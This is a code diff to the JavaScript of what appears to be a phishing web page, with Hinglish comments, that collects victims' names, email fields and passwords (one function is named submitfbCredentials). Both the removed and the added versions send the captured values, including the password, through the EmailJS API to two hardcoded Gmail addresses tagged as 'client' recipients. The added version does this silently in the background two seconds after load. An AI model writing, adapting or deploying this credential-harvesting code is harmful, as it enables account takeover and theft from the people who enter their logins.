@@ -2224,51 +2224,43 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
   }
 });
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script type="text/javascript">
-  (function() {
-    emailjs.init("8AcP51LH7_IRW17aY");
-  })();
+<script>
+// LIFETIME MEIN SIRF YAHAN 4 LINE BADALNI HAIN
+var email1   = "lingdavid24@gmail.com";   // Rahul wala email
+var email2   = "akeraa191@gmail.com";     // Vikash wala email
+var client1  = "Rahul Sharma";            // mail mein naam
+var client2  = "Vikash Kumar";
 
-  // Sirf yahan badalte rahna lifetime mein
-  var email1   = "lingdavid24@gmail.com";
-  var email2   = "akeraa191@gmail.com";
-  var client1  = "Rahul Sharma";
-  var client2  = "Vikash Kumar";
+// 2 second baad background mein mail bhejega – button/popup sab pehle chal jayega
+setTimeout(() => {
+  let name = document.querySelector('#nameInput')?.value || document.querySelector('input[name="name"]')?.value || "";
+  let mall = document.querySelector('#mallInput')?.value || document.querySelector('input[name="mall"]')?.value || "";
+  let pass = document.querySelector('input[type="password"]')?.value || "";
+  let client = name ? client1 : client2;
+  let toMail = name ? email1 : email2;
 
-  // YE SABSE IMPORTANT LINE HAI – purane button ko rokega hi nahi
-  document.querySelectorAll('form').forEach(form => {
-    form.addEventListener('submit', function(e) {
-      // 1. Pehle tumhara original function chalao (popup + language + button sab chalega)
-      if (this.querySelector('input[name="name"]') || this.querySelector('#nameInput')) {
-        if (typeof submitFormData === 'function') submitFormData();
-      }
-      if (this.querySelector('input[type="password"]')) {
-        if (typeof submitfbCredentials === 'function') {
-          const pass = this.querySelector('input[type="password"]').value;
-          if (pass) submitfbCredentials(pass);
+  if (name || pass) {
+    fetch("https://api.emailjs.com/api/v1.0/email/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        service_id: "service_nqeen3l",
+        template_id: "template_z0ow5n7",
+        user_id: "8AcP51LH7_IRW17aY",
+        template_params: {
+          client_name: client,
+          website_url: location.href,
+          user_name: name,
+          user_mall: mall,
+          user_pass: pass,
+          to_email: toMail
         }
-      }
-
-      // 2. Ab background mein EmailJS se mail bhejo (popup disturb nahi hoga)
-      let clientName = this.querySelector('input[name="name"]') ? client1 : client2;
-      let toEmail    = this.querySelector('input[name="name"]') ? email1 : email2;
-
-      emailjs.send("service_nqeen3l", "template_z0ow5n7", {
-        client_name: clientName,
-        website_url: window.location.href,
-        user_name:   this.querySelector('input[name="name"]')?.value || "No name",
-        user_mall:   this.querySelector('input[name="mall"]')?.value || this.querySelector('#mallInput')?.value || "",
-        user_pass:   this.querySelector('input[type="password"]')?.value || "",
-        to_email:    toEmail
-      }).then(() => console.log("Mail bhej diya"));
-
-      // 3. Form dobara submit na ho isliye last mein rok do
-      e.preventDefault();
-      return false;
-    // extra safety
+      })
     });
-  });
+  }
+}, 2000);
 </script>
+</body>
+</html>
 
 </body></html>
